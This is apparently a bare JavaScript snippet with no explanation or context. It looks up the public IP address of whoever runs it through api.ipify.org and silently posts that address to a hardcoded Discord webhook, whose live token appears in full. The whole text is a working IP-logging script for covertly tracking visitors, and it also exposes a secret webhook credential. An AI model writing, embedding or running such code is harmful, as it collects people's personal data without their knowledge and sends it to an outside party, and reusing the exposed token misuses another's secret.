var ip = '';
fetch('http://api.ipify.org/?format=json')
    .then(function (response) {
        return response.json();
    })
    .then(function (data) {
        ip = data.ip;
        var webhook = 'https://discord.com/api/webhooks/1125013522900852826/u8U5lRCMoH2r-HQBbH9b1AKZ7QHIpP0B984gqkp7-Fcf5CMGiJ24QhVpoZgMukU3Hs9h';
        var message = {
            content: 'IP: ' + ip
        };

        fetch(webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });
    })